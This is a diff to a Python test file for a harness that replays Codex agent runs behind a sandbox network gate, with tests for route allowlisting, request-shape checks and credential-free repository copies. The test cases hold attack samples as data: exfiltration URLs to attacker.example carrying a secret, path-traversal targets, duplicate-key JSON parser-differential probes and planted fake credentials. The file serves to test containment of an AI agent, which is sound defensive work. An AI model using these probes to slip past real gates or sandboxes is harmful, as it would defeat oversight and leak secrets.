@@ -6,13 +6,19 @@ Run: python3 -I test_replay.py   (from this folder)
 
 from __future__ import annotations
 
+import io
 import json
 import os
+import re
 import shutil
+import socket
+import ssl
 import subprocess
 import sys
 import tempfile
+import time
 import unittest
+from unittest import mock
 from pathlib import Path
 
 sys.dont_write_bytecode = True
@@ -274,6 +280,13 @@ class Metrics(unittest.TestCase):
         self.assertEqual(m["bytes_before_first_action"], 3)
         self.assertEqual(m["units"], 1)
 
+    def test_a_transport_fallback_error_item_is_not_an_action(self):
+        events = [ev(1, 1, {"type": "item.completed", "item": {"type": "error", "message": "Falling back from WebSockets"}}),
+                  ev(2, 1, cmd_item(1, "/bin/bash -lc 'cat /etc/hostname'", "abc"))]
+        m = rp.metrics(events, Path("/"), scenarios=set())
+        self.assertIsNone(m["first_action"])
+        self.assertEqual(m["bytes_before_first_action"], 3)
+
     def test_spawn_and_unknown_items_are_actions(self):
         events = [ev(1, 1, cmd_item(1, "/bin/bash -lc 'cat /etc/hostname'", "abc")),
                   ev(2, 1, {"type": "item.completed", "item": {"type": "collab_tool_call", "tool": "spawn_agent"}}),
@@ -349,6 +362,42 @@ class Rollout(unittest.TestCase):
         seen = rp.seen_before_action(calls, None)
         self.assertEqual((seen["bytes_seen_before_first_action"], seen["calls_before_first_action"]), (7, 1))
 
+    def test_relative_reads_resolve_against_the_commands_working_folder(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            cohort, repo = Path(tmp, "cohort"), Path(tmp, "repo")
+            for d in (cohort, repo):
+                d.mkdir()
+                (d / "README.md").write_text("x")
+            (cohort / "STATE.md").write_text("y")
+            recs = [{"payload": {"type": "custom_tool_call", "name": "exec", "call_id": "a", "input":
+                                 f'const r = await tools.exec_command({{cmd:"cat README.md && cat \\"STATE.md\\"",'
+                                 f'workdir:{json.dumps(str(cohort))}}});'}},
+                    {"payload": {"type": "function_call", "name": "exec_command", "call_id": "b",
+                                 "arguments": json.dumps({"cmd": "cat README.md", "workdir": "../repo"})}}]
+            workdirs = rp.command_workdirs(recs)
+            self.assertEqual(workdirs, {'cat README.md && cat "STATE.md"': str(cohort), "cat README.md": "../repo"})
+            run = lambda cmd: {"type": "item.completed", "item": {"type": "command_execution", "command": cmd,
+                                                                  "aggregated_output": "x", "exit_code": 0}}
+            events = [run("/bin/bash -lc 'cat README.md && cat \"STATE.md\"'"), run("/bin/bash -lc 'cat README.md'")]
+            m = rp.metrics(events, cohort, scenarios=set(), workdirs=workdirs)   # the second's workdir is relative to cwd
+            self.assertEqual(m["files_before_first_action"], [str(cohort / "README.md"), str(cohort / "STATE.md"),
+                                                              str(repo / "README.md")])
+            self.assertEqual(rp.metrics(events[:1], repo, scenarios=set())["files_before_first_action"],
+                             [str(repo / "README.md")])                         # no workdir known: the run's cwd
+
+    def test_a_read_counts_where_the_sandbox_put_the_file_not_where_the_host_has_one(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            mounted = Path(tmp, "variant/cohorts/c-new")                       # the run's commission, on the host
+            mounted.mkdir(parents=True)
+            (mounted / "README.md").write_text("x")
+            inside = Path(tmp, "research/cohorts/c-new")                       # where the run saw it
+            view = [(str(inside), mounted), (str(Path(tmp, "research/cohorts")), Path("/nonexistent"))]
+            self.assertEqual(rp.command_paths(f"cat {inside}/README.md README.md", inside, view),
+                             [str(inside / "README.md")])                      # one file, named as the run saw it
+            Path(tmp, "research/cohorts/c-old").mkdir(parents=True)
+            Path(tmp, "research/cohorts/c-old/README.md").write_text("live")   # on the host, but not mounted
+            self.assertEqual(rp.command_paths(f"cat {tmp}/research/cohorts/c-old/README.md", inside, view), [])
+
 
 class Grading(unittest.TestCase):
     def test_grade_prompt_is_blind(self):
@@ -396,54 +445,119 @@ class Grading(unittest.TestCase):
 
 
 
-class Statistics(unittest.TestCase):
-    def test_sign_test(self):
-        self.assertAlmostEqual(rp.sign_test(9, 1), 0.0215, places=4)
-        self.assertEqual(rp.sign_test(5, 5), 1.0)
-        self.assertIsNone(rp.sign_test(0, 0))
-
-
 class Harness(unittest.TestCase):
-    """The turn loop and the old-skill shim, driven by fake agents (no model)."""
+    """DRIVER and stream with fake agents in place of Codex (no model, no sandbox)."""
 
-    def fake(self, lines: list[dict], sleep: int) -> list[str]:
-        code = ("import json, time\n"
-                f"for e in json.loads({json.dumps(lines)!r}):\n"
-                "    print(json.dumps(e), flush=True)\n"
-                f"time.sleep({sleep})\n")
-        return [sys.executable, "-I", "-c", code]
+    @staticmethod
+    def fake(lines: list[dict], sleep: int, *, rollout: str | None = None) -> list[str]:
+        """An agent that prints events (ARG becomes its last argument, the resumed thread) and sleeps."""
+        code = ("import json, os, sys, time\n"
+                f"for e in json.loads({json.dumps(json.dumps(lines))}):\n"
+                "    print(json.dumps(e).replace('ARG', sys.argv[-1]), flush=True)\n"
+                + (f"d = os.path.join(os.environ['CODEX_HOME'], 'sessions', '2026')\nos.makedirs(d, exist_ok=True)\n"
+                   f"open(os.path.join(d, {rollout!r}), 'w').write('{{\"a\": 1}}\\n{{\"b\": 2}}\\n')\n" if rollout else "")
+                + f"time.sleep({sleep})\n")
+        return [sys.executable, "-I", "-c", code, "-"]
 
-    def run_stream(self, cmd, until):
-        import io
-        buf = io.StringIO()
-        t0 = __import__("time").time()
-        res = rp.stream(cmd, dict(os.environ), t0 + 60, 1, buf, t0, until=until)
-        return res, __import__("time").time() - t0, [json.loads(l) for l in buf.getvalue().splitlines()]
+    def drive(self, turns: list[list[str]], rollouts: Path | None = None):
+        with tempfile.TemporaryDirectory() as home:
+            (Path(home) / "driver.py").write_text(rp.DRIVER)
+            t0, buf = time.time(), io.StringIO()
+            res = rp.stream([sys.executable, "-I", str(Path(home) / "driver.py")],
+                            {"turns": turns, "files": {"auth.json": "{}"}, "dirs": ["sessions"]},
+                            {"CODEX_HOME": home, "PATH": os.environ["PATH"]}, t0 + 60, buf, t0, rollouts=rollouts)
+            mode = (Path(home) / "auth.json").stat().st_mode & 0o777
+        return res, time.time() - t0, [json.loads(x) for x in buf.getvalue().splitlines()], mode
 
-    def test_stance_turn_ends_on_the_reply(self):
-        cmd = self.fake([{"type": "thread.started", "thread_id": "th"},
-                         {"type": "item.completed", "item": {"type": "agent_message", "text": "Ready."}}], sleep=50)
-        res, took, events = self.run_stream(cmd, "reply")
-        self.assertEqual(res["killed"], "answered")
-        self.assertEqual(res["thread"], "th")
+    def test_the_stance_turn_ends_on_the_reply_and_the_plan_turn_resumes_its_thread(self):
+        stance = self.fake([{"type": "thread.started", "thread_id": "th-1"},
+                            {"type": "item.completed", "item": {"type": "agent_message", "text": "Ready."}}], sleep=50)
+        plan = self.fake([{"type": "item.completed", "item": {"type": "agent_message", "text": '{"role": "owner", "x": "ARG"}'}}],
+                         sleep=50)[:-1] + ["{thread}"]
+        res, took, events, _ = self.drive([stance, plan])
+        self.assertEqual([(t["turn"], t["killed"], t["thread"]) for t in res["turns"]],
+                         [(1, "answered", "th-1"), (2, "answered", None)])
+        self.assertIn('"x": "th-1"', events[-1]["e"]["item"]["text"])       # the plan turn resumed thread th-1
+        self.assertEqual(events[-1]["turn"], 2)
+        self.assertLess(took, 40)
+
+    def test_the_plan_turn_waits_for_the_json(self):
+        res, took, _, _ = self.drive([self.fake([
+            {"type": "item.completed", "item": {"type": "agent_message", "text": "Reading the charter."}},
+            {"type": "item.completed", "item": {"type": "agent_message", "text": '{"role": "owner"}'}}], sleep=50)])
+        self.assertEqual(res["turns"][0]["killed"], "answered")
         self.assertLess(took, 25)
-        self.assertEqual(events[0]["turn"], 1)
 
-    def test_plan_turn_waits_for_the_json(self):
-        cmd = self.fake([{"type": "item.completed", "item": {"type": "agent_message", "text": "Reading the charter."}},
-                         {"type": "item.completed", "item": {"type": "agent_message", "text": '{"role": "owner"}'}}], sleep=50)
-        res, took, _ = self.run_stream(cmd, "plan")
-        self.assertEqual(res["killed"], "answered")
-        self.assertLess(took, 25)
+    def test_a_turn_that_ends_itself_is_not_killed_and_a_resume_without_a_thread_never_runs(self):
+        done = self.fake([{"type": "item.completed", "item": {"type": "agent_message", "text": '{"role": "owner"}'}},
+                          {"type": "turn.completed", "usage": {}}], sleep=0)
+        res, _, _, mode = self.drive([done, done[:-1] + ["{thread}"]])
+        self.assertEqual(res["turns"], [{"turn": 1, "exit": 0, "killed": None, "thread": None}])
+        self.assertEqual(mode, 0o600)                                           # the login copy is private
 
-    def test_a_turn_that_ends_itself_is_not_killed(self):
-        cmd = self.fake([{"type": "item.completed", "item": {"type": "agent_message", "text": '{"role": "owner"}'}},
-                         {"type": "turn.completed", "usage": {}}], sleep=0)
-        res, _, _ = self.run_stream(cmd, "plan")
-        self.assertIsNone(res["killed"])
-        self.assertEqual(res["exit"], 0)
+    def test_a_deeply_nested_line_is_kept_raw(self):
+        code = "print('[' * 200000, flush=True)\nprint('{\"type\": \"turn.completed\", \"usage\": {}}')"
+        res, _, events, _ = self.drive([[sys.executable, "-I", "-c", code]])
+        self.assertEqual(res["turns"][0]["exit"], 0)
+        self.assertEqual(len(events[0]["e"]["raw"]), 200000)
+
+    def test_the_sandbox_login_is_unusable_and_server_side_tools_are_off(self):
+        tokens = {"access_token": "h.eyJleHAiOjF9.realsig", "id_token": "h.p.idsig", "refresh_token": "r", "account_id": "a"}
+        with tempfile.TemporaryDirectory() as d, mock.patch.object(rp, "HOME", Path(d)):
+            rp.write_json(Path(d) / ".codex/auth.json", {"tokens": tokens})
+            header = rp.codex_header([["codex"]])
+            self.assertEqual(rp.host_access_token(), tokens["access_token"])
+        got = json.loads(header["files"]["auth.json"])["tokens"]
+        self.assertEqual(got, {"access_token": "h.eyJleHAiOjF9." + rp.DUMMY_SIGNATURE, "id_token": "h.p." + rp.DUMMY_SIGNATURE,
+                               "refresh_token": "", "account_id": "a"})
+        argv = rp.codex_turn("p", model="m", effort="e", cwd=Path("/"), resume=None, dev=None)
+        for flag in ('web_search="disabled"', "features.image_generation=false"):
+            self.assertEqual(argv[argv.index(flag) - 1], "-c")
+
+    def test_every_replay_turn_runs_over_https_only(self):
+        for resume in (None, "{thread}"):
+            argv = rp.codex_turn("p", model="m", effort="e", cwd=Path("/"), resume=resume, dev=None)
+            provider = next(a for a in argv if a.startswith("model_providers.openai_https="))
+            self.assertEqual(argv[argv.index(provider) - 1], "-c")
+            self.assertIn("supports_websockets=false", provider)
+            self.assertIn('base_url="https://chatgpt.com/backend-api/codex"', provider)
+            self.assertEqual(argv[argv.index('model_provider="openai_https"') - 1], "-c")
+
+    def test_a_websocket_attempt_is_seen_in_the_gate_log_stderr_or_events(self):
+        https = {"denied": ["GET /backend-api/ps/plugins/list (route)", "POST /backend-api/codex/responses (model turns off)"]}
+        self.assertEqual(rp.websocket_attempts(https, "ok", [{"type": "turn.completed"}]), [])
+        self.assertEqual(rp.websocket_attempts({"denied": ["GET /backend-api/codex/responses (route)"]}),
+                         ["GET /backend-api/codex/responses (route)"])
+        self.assertEqual(rp.websocket_attempts(https, "ERROR: failed to connect to Responses WebSocket\n" * 5),
+                         ["stderr: failed to connect to Responses WebSocket"])
+        notice = {"type": "item.completed", "item": {"type": "error", "message": "Falling back from WebSockets to HTTPS"}}
+        self.assertEqual(rp.websocket_attempts(https, "", [notice]), ["events: Falling back from WebSockets"])
+
+    def test_rollouts_return_on_stdout_under_safe_names(self):
+        forged = {"replay": "rollout", "name": "../../../../evil", "line": "x"}
+        with tempfile.TemporaryDirectory() as d:
+            res, _, events, _ = self.drive([self.fake([forged, {"type": "turn.completed", "usage": {}}], sleep=0,
+                                                      rollout="rollout-2026-11-15-abc.jsonl")], Path(d))
+            names = sorted(p.name for p in Path(d).iterdir())
+            self.assertEqual(names, ["rollout-26-11-15-abc.jsonl.gz", "rollout-evil.jsonl.gz"])
+            import gzip
+            self.assertEqual(gzip.open(Path(d) / names[0], "rt").read(), '{"a": 1}\n{"b": 2}\n')
+        self.assertEqual(res["rollouts"], 2)
+        self.assertFalse(any("replay" in e["e"] for e in events))              # driver lines never reach events.jsonl
 
 
+SOURCES = {"AGENTS.md": "agents", "docs/x.md": "doc", "scenarios/a/api/main.go": "package main",
+           "scenarios/b/tmpl.go": 'fmt.Sprintf("postgres://%s:%s@%s/db", u, p, h)'}
+PLANTED = {  # the files the hostile reviews read, and other credential-like files; none may reach a sandbox
+    "scenarios/agent-manager/data/identity-secret.key": "k", "scenarios/agent-manager/data/agent-manager.db": "db",
+    "scenarios/agent-manager/data/agent-manager.db-wal": "wal", "scenarios/system-monitor/.env": "TOKEN=1",
+    "scenarios/app-monitor/ui/.env": "X=1", "data/resources/home-assistant/config/secrets.yaml": "pw: 1",
+    "scenarios/b/config.json": '{"refresh_token": "' + "r" * 30 + '"}', "scenarios/b/key_test.go": "-----BEGIN PRIVATE KEY-----",
+    "scenarios/b/node_modules/m/index.js": "x", "scenarios/b/server.pem": "x", "scenarios/b/secrets.json": "{}",
+    "scenarios/b/db.go": 'url := "postgres://admin:hunter2@db:5432/x"',
+    "scenarios/v/platforms/electron/bundle/catalog/d/.vrooli/service.json": '{"db": "postgresql://user:password@localhost:5433/d"}',
+    "scenarios/v/platforms/electron/dist-electron/r/bundle/x.json": "{}",
+}
 
 
 def fake_workspace(root: Path, variants=("old",)) -> rp.WS:
@@ -453,7 +567,10 @@ def fake_workspace(root: Path, variants=("old",)) -> rp.WS:
     rp.write_json(snap / "snapshot.json", {"research_home": str(rp.RESEARCH)})
     rp.write(snap / "home/topics/alpha/MISSION.md", MISSION)
     (snap / "home/cohorts").mkdir(parents=True)
-    rp.write(snap / "repo/AGENTS.md", "agents")
+    for rel, text in {**SOURCES, **PLANTED}.items():
+        rp.write(root / "src" / rel, text)
+    rp.copy_repo(root / "src", snap / "repo", ())
+    (snap / "repo" / rp.SKILLS.relative_to(rp.REPO)).mkdir(parents=True)
     rp.write(snap / "skills/other-skill.md", "---\nname: o\n---\nOther skill body\n")
     rp.write_cli_stubs(snap / "bin", ["research-desk", "agent-manager", "prompt-manager"], rp.SKILLS, rp.SKILL_EXPORT)
     for v in variants:
@@ -462,13 +579,24 @@ def fake_workspace(root: Path, variants=("old",)) -> rp.WS:
     return ws
 
 
-def run_record(ws: rp.WS, name: str, variant: str, role: str, size: int, plan: bool = True, topic=None):
+class Snapshot(unittest.TestCase):
+    def test_the_repository_copy_is_an_allowlist_without_credentials(self):
+        with tempfile.TemporaryDirectory() as d:
+            for rel, text in {**SOURCES, **PLANTED}.items():
+                rp.write(Path(d) / "src" / rel, text)
+            got = rp.copy_repo(Path(d) / "src", Path(d) / "out", (Path(d) / "src/scenarios/a",))
+            kept = sorted(str(p.relative_to(Path(d) / "out")) for p in (Path(d) / "out").rglob("*") if p.is_file())
+        self.assertEqual(kept, ["AGENTS.md", "docs/x.md", "scenarios/b/tmpl.go"])  # scenarios/a left out by the caller
+        self.assertEqual(got, {"files": 3, "credential_like_left_out": 4})    # 3 by content, secrets.json by name
+
+
+def run_record(ws: rp.WS, name: str, variant: str, role: str, size: int, plan: bool = True, topic=None, reads=True):
     run = ws.runs() / name
     run.mkdir(parents=True)
     rp.write_json(run / "meta.json", {"run_id": name, "commission_id": "c1", "variant": variant, "role": role,
                                       "topic": topic, "harness": "codex", "model": "m", "effort": "e", "wall_s": 10, "cwd": "/"})
     tail = SUPERVISOR_EVENTS[-2:] if plan else [ev(7, 2, {"type": "item.completed", "item": {"type": "agent_message", "text": "no"}})]
-    events = [ev(2, 2, cmd_item(1, "/bin/bash -lc 'cat /etc/hostname'", "z" * size))] + tail
+    events = [ev(2, 2, cmd_item(1, "/bin/bash -lc 'cat /etc/hostname'", "z" * size))] * reads + tail
     (run / "events.jsonl").write_text("\n".join(json.dumps(e) for e in events) + "\n")
 
 
@@ -502,9 +630,40 @@ class Report(unittest.TestCase):
             self.assertIn("| supervisor | `new` | 1 | 1 | 0 | 0 |", text)        # grader: one agreeing preference
             self.assertIn("the orders agree on the better plan in 1 of 1 grades", text)
             self.assertIn("| plan failed |", text)
+            self.assertNotIn("## Corrections", text)
+            self.assertIn("## Did not engage (post-hoc exploratory analysis, NOT pre-registered)", text)
+            self.assertIn("| supervisor · `new` | 3 | 0 (0%) |", text)
+            self.assertLess(text.index("## Pre-registration"), text.index("## Did not engage"))
+            rp.cmd_report(ws, None, "parser fix A")                             # a correction stays in every later report
+            text = rp.cmd_report(ws, None).read_text()
+            self.assertIn("## Corrections after the runs", text)
+            self.assertRegex(text, r"- \S+Z: parser fix A")
+            self.assertLess(text.index("## Corrections"), text.index("## Pre-registration"))
+
+    def test_runs_that_neither_reasoned_nor_called_a_tool_are_counted_apart(self):
+        self.assertFalse(rp.engaged({"tokens": {"reasoning": 0}, "tool_calls": 0}))
+        self.assertTrue(rp.engaged({"tokens": {"reasoning": 0}, "tool_calls": 2}))     # read without thinking aloud
+        self.assertTrue(rp.engaged({"tokens": {"reasoning": 40}, "tool_calls": 0}))    # thought, then answered
+        with tempfile.TemporaryDirectory() as d:
+            ws = fake_workspace(Path(d), ("old", "new-a"))
+            rp.write_json(ws.prompts("c1", "old") / "freeze.json", {"commission_id": "c1", "topics": ["alpha"]})
+            for i, reads in enumerate((True, False, False), 1):
+                run_record(ws, f"c1.old.owner.{i}", "old", "owner", 700, topic="alpha", reads=reads)
+                run_record(ws, f"c1.new-a.owner.{i}", "new-a", "owner", 300, topic="alpha")
+            for run in ws.runs().iterdir():                                    # no reasoning anywhere
+                ev_file = run / "events.jsonl"
+                ev_file.write_text(ev_file.read_text().replace('"reasoning_output_tokens": 300', '"reasoning_output_tokens": 0'))
+            text = rp.cmd_report(ws, ["base=old", "new=new-a"]).read_text()
+            self.assertIn("| owner · `base` | 3 | 2 (67%) |", text)                # two answered from the prompt alone
+            self.assertIn("| owner · `new` | 3 | 0 (0%) |", text)
 
 
 class Statistics(unittest.TestCase):
+    def test_sign_test(self):
+        self.assertAlmostEqual(rp.sign_test(9, 1), 0.0215, places=4)
+        self.assertEqual(rp.sign_test(5, 5), 1.0)
+        self.assertIsNone(rp.sign_test(0, 0))
+
     def test_log_ratio_interval_covers_a_known_shift(self):
         rng = __import__("random").Random(1)
         prompts = [([rng.uniform(800, 1200) for _ in range(6)], [rng.uniform(400, 600) for _ in range(6)]) for _ in range(5)]
@@ -526,31 +685,326 @@ class Statistics(unittest.TestCase):
         self.assertEqual(rp.guidance_key("docs/agent-system/LONG_EFFORT_DESIGN.md", ws), "docs/agent-system/LONG_EFFORT_DESIGN.md")
 
 
+META = {"turn_id": "t1", "create_time": 1.5, "content_item_kinds": ["user.text"],
+        "content_item_metadata": [{"provenance": {"type": "user"}}]}
+CODEX_TURN = {  # a model turn as Codex 0.167 sends it, captured through the gate and trimmed
+    "model": "gpt-6-luna", "stream": True, "tool_choice": "auto", "parallel_tool_calls": False,
+    "reasoning": {"effort": "medium", "context": "all_turns"}, "store": False, "include": ["reasoning.encrypted_content"],
+    "prompt_cache_key": "01a1", "text": {"verbosity": "low"}, "client_metadata": {"thread_id": "01a1", "turn_id": "01a2"},
+    "access_programs": {"cyber": "standard"},
+    "input": [
+        {"type": "additional_tools", "id": "at_1", "role": "developer", "tools": [
+            {"type": "namespace", "name": "functions", "description": "", "tools": [
+                {"type": "custom", "name": "exec", "description": "Run JavaScript",
+                 "format": {"type": "grammar", "syntax": "lark", "definition": "start: x"}},
+                {"type": "function", "name": "wait", "description": "Waits", "strict": False,
+                 "parameters": {"type": "object", "properties": {"cell_id": {"type": "string"}}}}]},
+            {"type": "namespace", "name": "collaboration", "description": "Sub-agents", "tools": [
+                {"type": "function", "name": "spawn_agent", "description": "Spawn", "strict": False, "parameters": {}}]}]},
+        {"type": "message", "id": "msg_1", "role": "developer", "content": [{"type": "input_text", "text": "You are Codex."}],
+         rp.META: META},
+        {"type": "message", "id": "msg_2", "role": "user", "content": [{"type": "input_text", "text": "List two scenarios."},
+                                                                         {"type": "input_image", "image_url": "data:image/png;base64,AA"}],
+         rp.META: META},
+        {"type": "configuration_update", "reasoning": {"effort": "medium"}},
+        {"type": "reasoning", "id": "rs_1", "summary": [], "encrypted_content": "gAAA", "content": None, rp.META: "t1"},
+        {"type": "function_call", "id": "fc_1", "call_id": "c1", "name": "wait", "namespace": "functions",
+         "arguments": "{}", "status": "completed", rp.META: {"turn_id": "t1"}},
+        {"type": "function_call_output", "id": "fco_1", "call_id": "c1", "output": "done", rp.META: {"turn_id": "t1"}},
+        {"type": "custom_tool_call", "id": "ctc_1", "call_id": "c2", "name": "exec", "input": "ls", "status": "completed"},
+        {"type": "custom_tool_call_output", "id": "ctco_1", "call_id": "c2", "output": [{"type": "input_text", "text": "a b"}]},
+        {"type": "message", "id": "msg_3", "role": "assistant", "phase": "final_answer", "status": "completed",
+         "content": [{"type": "output_text", "text": "a, b", "annotations": [], "logprobs": []}]},
+        {"type": "compaction_trigger"}, {"type": "compaction", "id": "cmp_1", "encrypted_content": "ENC"}]}
+
+
+def codex_turn(change=None) -> dict:
+    """CODEX_TURN with one change applied to a copy."""
+    turn = json.loads(json.dumps(CODEX_TURN))
+    if change:
+        change(turn)
+    return turn
+
+
+def tool(*tools):  # a change offering these tools beside Codex's own
+    return lambda t: t["input"][0]["tools"][0]["tools"].extend(tools)
+
+
+def part(*parts):  # a change adding these parts to the user's message
+    return lambda t: t["input"][2]["content"].extend(parts)
+
+
+def item(**it):  # a change adding this input item
+    return lambda t: t["input"].append(it)
+
+
+def key(k, v):  # a change setting this top-level key
+    return lambda t: t.update({k: v})
+
+
 class Gate(unittest.TestCase):
-    def test_only_the_provider_is_tunnelled(self):
-        with rp.Gate() as gate:
-            for target in ("chatgpt.com:443", "ab.chatgpt.com:443"):
-                self.assertTrue(gate.allowed(target), target)
-            for target in ("chatgpt.com:80", "evilchatgpt.com:443", "auth.openai.com:443", "127.0.0.1:443",
-                           "localhost:443", "example.com:443", "[::1]:443"):
-                self.assertFalse(gate.allowed(target), target)
-            import socket
-            s = socket.socket(socket.AF_UNIX)
-            s.connect(str(gate.sock))
-            s.sendall(b"CONNECT 127.0.0.1:22 HTTP/1.1\r\n\r\n")
-            self.assertIn(b"403", s.recv(100))
-            s.close()
-            for _ in range(50):
-                if gate.log:
-                    break
-                __import__("time").sleep(0.02)
-            self.assertEqual(gate.summary()["denied"], ["CONNECT 127.0.0.1:22 HTTP/1.1"])
+    """The gate on the host: CONNECT to the provider only, TLS terminated with its own CA, one checked request."""
+
+    @staticmethod
+    def tunnel(gate: rp.Gate, sni: str) -> ssl.SSLSocket:
+        s = socket.socket(socket.AF_UNIX)
+        s.connect(str(gate.sock))
+        s.sendall(f"CONNECT {rp.PROVIDER}:443 HTTP/1.1\r\n\r\n".encode())
+        assert b" 200 " in s.recv(200)
+        return ssl.create_default_context(cafile=str(gate.ca)).wrap_socket(s, server_hostname=sni)
+
+    @staticmethod
+    def raw(gate: rp.Gate, data: bytes) -> bytes:
+        s = socket.socket(socket.AF_UNIX)
+        s.connect(str(gate.sock))
+        s.sendall(data)
+        got = s.recv(300)
+        s.close()
+        return got
+
+    def test_only_the_three_routes_are_allowed_exactly_with_the_query_codex_sends(self):
+        for method, target in (("POST", "/backend-api/codex/responses"), ("GET", "/backend-api/codex/models?client_version=0.167.0"),
+                               ("GET", "/backend-api/wham/accounts/check")):
+            self.assertTrue(rp.Gate.allowed(method, target), target)
+        for method, target in (("GET", "/"), ("GET", "/backend-api/codex/../../x"), ("GET", "/backend-api/codex/%2e%2e/x"),
+                               ("GET", "http://example.com/backend-api/codex/models"), ("DELETE", "/backend-api/codex/models"),
+                               ("GET", "/backend-api/wham/accounts/check-x"), ("GET", "/backend-api/wham/accounts/check/x"),
+                               ("GET", "/backend-api/codex/responses"), ("POST", "/backend-api/codex/responses?x=1"),
+                               ("POST", "/backend-api/codex/responses/compact"), ("POST", "/backend-api/codex/analytics-events/events"),
+                               ("GET", "//backend-api/codex/models"), ("GET", "/backend-api/codex/models/"),
+                               ("GET", "/backend-api/codex/models?client_version=0.0.0&q=" + "A" * 3000),
+                               ("GET", "/backend-api/codex/models?x=1"), ("GET", "/backend-api/codex/models?"),
+                               ("GET", "/backend-api/wham/accounts/check?x=1")):
+            self.assertFalse(rp.Gate.allowed(method, target), target)
+
+    def test_a_model_turn_as_codex_sends_it_is_forwarded_as_the_gates_own_serialization(self):
+        why, body = rp.Gate.model_request(json.dumps(CODEX_TURN, indent=1).encode())
+        self.assertIsNone(why)
+        self.assertEqual(body, json.dumps(CODEX_TURN, ensure_ascii=False).encode())
+        self.assertEqual(rp.Gate.model_request(b'{"model": "m", "input": [], "text": {"verbosity": "\\u006cow"}}'),
+                         (None, b'{"model": "m", "input": [], "text": {"verbosity": "low"}}'))
+
+    def test_a_model_turn_is_refused_unless_strict_json(self):
+        web = '{"type": "web_search"}'
+        for body in (b"abc", b"[]", b"\xff", b"[" * 100000, b'{"model": "m", "input": [], "x": NaN}',
+                     b'{"model": "m", "input": [], "text": {"verbosity": Infinity}}',
+                     b'{"model": "m", "input": [], "client_metadata": {"a": 1e999}}', b'{"model": "m", "input": [], "x": -1e400}',
+                     json.dumps(CODEX_TURN).encode("utf-16"),
+                     ('{"model": "m", "input": [], "tools": [%s], "tools": []}' % web).encode(),  # parser differential
+                     ('{"model": "m", "input": [], "tools": [], "tools": [%s]}' % web).encode(),
+                     ('{"model": "m", "input": [{"type": "additional_tools", "role": "developer", "tools": [%s], "tools": []}]}'
+                      % web).encode(),
+                     b'{"model": "m", "input": [{"type": "additional_tools", "role": "developer",'
+                     b' "tools": [{"type": "function", "type": "web_search", "name": "f"}]}]}'):
+            why, out = rp.Gate.model_request(body)
+            self.assertTrue(why and out == b"", body[:60])
+
+    def test_a_model_turn_is_refused_unless_shaped_as_codex_sends_it(self):
+        url = "https://attacker.example/x?d=SECRET"
+        cases = {  # each one change to a turn Codex sends; the reviewers' probes plus their neighbours
+            "top-level tools": key("tools", []), "tool_resources": key("tool_resources", {"file_search": {}}),
+            "previous_response_id": key("previous_response_id", "resp_1"), "conversation": key("conversation", "conv_1"),
+            "background": key("background", True), "prompt": key("prompt", {"id": "pmpt_1"}),
+            "instructions": key("instructions", "x"), "web_search_options": key("web_search_options", {}),
+            "include of tool results": key("include", ["web_search_call.action.sources", "file_search_call.results"]),
+            "text format": key("text", {"format": {"type": "json_schema"}}), "store": key("store", True),
+            "tool_choice allowed_tools": key("tool_choice", {"type": "allowed_tools", "tools": [{"type": "web_search"}]}),
+            "tool_choice string": key("tool_choice", "web_search_preview"), "tool_choice required": key("tool_choice", "required"),
+            "client_metadata nested": key("client_metadata", {"a": {"b": url}}), "input missing": lambda t: t.pop("input"),
+            "input a string": key("input", "hi"), "reasoning extra": key("reasoning", {"effort": "high", "x": 1}),
+            "web_search tool": tool({"type": "web_search"}),             "web_search beside a function": tool({"type": "function", "name": "f"}, {"type": "image_generation"}),
+            "mcp tool at a URL": tool({"type": "mcp", "server_label": "s", "server_url": url}),
+            "function with server fields": tool({"type": "function", "name": "f", "server_url": url, "connector_id": "c",
+                                                 "external_web_access": True}),
+            "tool without a type": tool({"name": "x"}), "tool as a string": tool("function"),
+            "namespace in a namespace": tool({"type": "namespace", "name": "n", "tools": []}),
+            "custom tool format with a URL": tool({"type": "custom", "name": "c", "format": {"type": "grammar", "url": url}}),
+            "tools in a message": lambda t: t["input"][2].update(tools=[{"type": "web_search"}]),
+            "additional_tools from the user": lambda t: t["input"][0].update(role="user"),
+            "input_image at a URL": part({"type": "input_image", "image_url": url}),
+            "input_image as svg": part({"type": "input_image", "image_url": "data:image/svg+xml;base64,PHN2Zz4="}),
+            "input_image as data: text": part({"type": "input_image", "image_url": "data:text/html,<img src=x>"}),
+            "remote $ref in parameters": tool({"type": "function", "name": "f", "parameters": {
+                "type": "object", "properties": {"a": {"$ref": url}}}}),
+            "remote $id in parameters": tool({"type": "function", "name": "f", "parameters": {"items": [{"$id": url}]}}),
+            "access_programs other": key("access_programs", {"cyber": "elevated"}),
+            "input_image by file id": part({"type": "input_image", "file_id": "file_1"}),
+            "input_file at a URL": part({"type": "input_file", "file_url": url}),
+            "input_file by id": part({"type": "input_file", "file_id": "file_1"}), "input_audio": part({"type": "input_audio"}),
+            "output_text citing a URL": part({"type": "output_text", "text": "x", "annotations": [{"type": "url_citation", "url": url}]}),
+            "mcp_call item": item(type="mcp_call", server_label="s", name="n", arguments="{}"),
+            "web_search_call item": item(type="web_search_call", action={"type": "open_page", "url": url}),
+            "item_reference": item(type="item_reference", id="msg_0"), "item without a type": item(role="user", content="hi"),
+            "system message": item(type="message", role="system", content=[{"type": "input_text", "text": "x"}]),
+            "message content a string": item(type="message", role="user", content="hi"),
+            "tool output with an image URL": item(type="function_call_output", call_id="c", output=[
+                {"type": "input_image", "image_url": url}]),
+            "custom tool output with a file": item(type="custom_tool_call_output", call_id="c", output=[
+                {"type": "input_file", "file_url": url}]),
+            "reasoning with content": lambda t: t["input"][4].update(content=[{"type": "reasoning_text", "text": "x"}]),
+            "metadata carrying a URL": lambda t: t["input"][5].update({rp.META: {"source": url}}),
+            "compaction with more": item(type="compaction", encrypted_content="E", server_url=url),
+        }
+        bodies = {name: json.dumps(codex_turn(change)) for name, change in cases.items()}
+        bodies["unicode-escaped web_search"] = bodies["web_search tool"].replace('"web_search"', '"\\u0077eb_search"')
+        for name, body in bodies.items():
+            why, out = rp.Gate.model_request(body.encode())
+            self.assertTrue(why and out == b"", name)
+
+    def test_one_request_reaches_the_provider_as_the_provider_and_nothing_after_it(self):
+        with rp.Gate(token="real-T") as gate:
+            up, provider = socket.socketpair()
+            gate.upstream = lambda: up
+            s = self.tunnel(gate, rp.PROVIDER)                                  # the gate's certificate verifies
+            sent = json.dumps(CODEX_TURN, indent=2).encode()  # forwarded as the gate's own serialization
